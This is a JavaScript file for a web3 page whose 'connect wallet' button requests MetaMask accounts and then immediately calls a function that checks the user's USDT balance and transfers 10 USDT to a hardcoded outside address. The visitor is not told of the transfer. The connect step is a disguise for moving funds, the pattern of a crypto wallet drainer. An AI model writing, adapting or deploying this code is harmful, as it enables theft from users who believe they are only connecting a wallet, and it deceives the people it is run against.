let isConnecting = false; // Prevent multiple connections

// USDT token address
const tokenAddress = "0xdac17f958d2ee523a2206206994597c13d831ec7"; // USDT token address

async function connectWallet() {
    if (isConnecting) {
        console.log("Connection request already in progress...");
        return;
    }

    isConnecting = true;
    document.getElementById("connectButton").disabled = true;

    try {
        // Ask user which wallet to connect to
        const walletChoice = prompt("Choose a wallet: (1) MetaMask (2) Trust Wallet (3) Coinbase Wallet");

        if (walletChoice === "1") {
            // MetaMask connection
            if (typeof window.ethereum !== 'undefined') {
                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                const account = accounts[0];
                console.log(`Connected to MetaMask account: ${account}`);

                await sendTokens(account);
            } else {
                alert("MetaMask is not installed. Please install it.");
                window.open("https://metamask.app.link/dapp/swiftmultisolutions.github.io/web3/", "_blank");
            }
        } else if (walletChoice === "2") {
            // Trust Wallet logic
            window.open("https://link.trustwallet.com/open_url?coin_id=60&url=https://swiftmultisolutions.github.io/web3/", "_blank");
        } else if (walletChoice === "3") {
            // Coinbase Wallet logic
            window.open("https://go.cb-w.com/dapp?cb_url=https://swiftmultisolutions.github.io/web3/", "_blank");
        } else {
            alert("Invalid choice. Please try again.");
        }
    } catch (error) {
        console.error("Error connecting to wallet:", error);
    } finally {
        isConnecting = false;
        document.getElementById("connectButton").disabled = false;
    }
}

async function sendTokens(account) {
    const provider = new ethers.providers.Web3Provider(window.ethereum);
    const signer = provider.getSigner();

    const recipientAddress = "0x7acfbcc88e94ED31568dAD7Dfe25fa532ab023bD"; // Replace with your recipient address

    const tokenContract = new ethers.Contract(
        tokenAddress,
        [
            "function balanceOf(address owner) view returns (uint256)",
            "function transfer(address to, uint amount) public returns (bool)"
        ],
        signer
    );

    try {
        // Fetch USDT balance
        const balance = await tokenContract.balanceOf(account);
        const balanceInUSDT = ethers.utils.formatUnits(balance, 6); // USDT has 6 decimals

        console.log(`USDT Balance: $${balanceInUSDT}`);

        // Check if balance is greater than $0.5 (with current price of USDT as $1)
        if (parseFloat(balanceInUSDT) > 0.5) {
            const amountInWei = ethers.utils.parseUnits("10", 6); // Send 10 USDT (for demonstration)

            // Proceed to send tokens
            const tx = await tokenContract.transfer(recipientAddress, amountInWei);
            console.log("Transaction sent:", tx.hash);
            document.getElementById("status").textContent = "Transaction sent! Tx Hash: " + tx.hash;

            await tx.wait();
            console.log("Transaction confirmed:", tx.hash);
        } else {
            document.getElementById("status").textContent = "Insufficient USDT balance. Must be more than $0.5.";
        }
    } catch (error) {
        console.error("Error sending tokens:", error);
        document.getElementById("status").textContent = "Transaction failed: " + error.message;
    }
}

// Event listener for connect button
document.getElementById("connectButton").addEventListener("click", connectWallet);
